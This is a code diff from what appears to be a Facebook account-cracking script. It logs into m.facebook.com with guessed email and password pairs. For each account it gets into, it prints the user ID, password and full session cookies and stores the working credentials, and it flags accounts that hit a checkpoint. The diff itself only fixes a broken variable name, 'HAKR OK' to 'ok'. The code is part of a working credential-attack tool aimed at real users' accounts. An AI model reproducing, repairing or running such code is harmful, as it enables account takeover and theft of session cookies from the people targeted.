@@ -257,13 +257,13 @@ class create:
                                 rex = self.ses.post('https://m.facebook.com'+x.get('action'), headers=headers1, data=data2)
                                 if 'checkpoint' in rex.url:
                                     cok = self.ses.cookies.get_dict()
-                                    HAKR OK.append(email+passw)
+                                    ok.append(email+passw)
                                     print ('\r\033[1;33m[CP] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                                 else:
                                     coki = (";").join([ "%s=%s" % (key, value) for key, value in self.ses.cookies.get_dict().items() ])
                                     cok = self.ses.cookies.get_dict()
                                     print ('\r\033[1;32m[OK] '+cok['c_user']+' | '+passw+' | '+coki+'\033[0;97m     ')
-                                    HAKR OK.append(email+passw)
+                                    ok.append(email+passw)
             except requests.exceptions.ConnectionError:
                 time.sleep(1)
                 pass
